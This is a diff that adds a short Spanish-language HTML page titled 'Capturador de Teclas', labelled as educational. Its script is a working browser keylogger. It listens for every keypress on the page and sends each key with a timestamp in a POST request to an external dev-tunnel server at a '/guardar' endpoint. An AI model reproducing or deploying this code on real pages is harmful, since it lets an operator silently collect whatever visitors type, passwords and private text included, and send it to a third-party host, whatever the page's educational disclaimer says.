@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+        }
+        h1 {
+            color: #e74c3c;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Capturador de Teclas</h1>
+    <p>Presiona cualquier tecla mientras estés en esta página.</p>
+    <p><strong>Nota:</strong> Este ejemplo es para propósitos educativos.</p>
+    <script>
+        // Enviar pulsaciones al servidor
+        document.addEventListener('keydown', (evento) => {
+            const tecla = evento.key; // Captura la tecla presionada
+            const data = { tecla: tecla, timestamp: new Date().toISOString() }; // Datos a enviar
+
+            // Enviar datos al servidor
+            fetch('https://xzmnr14r-3000.brs.devtunnels.ms/guardar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            })
+            .then(response => console.log(`Tecla "${tecla}" enviada al servidor.`))
+            .catch(err => console.error('Error al enviar los datos:', err));
+        });
+    </script>
+</body>
+</html>
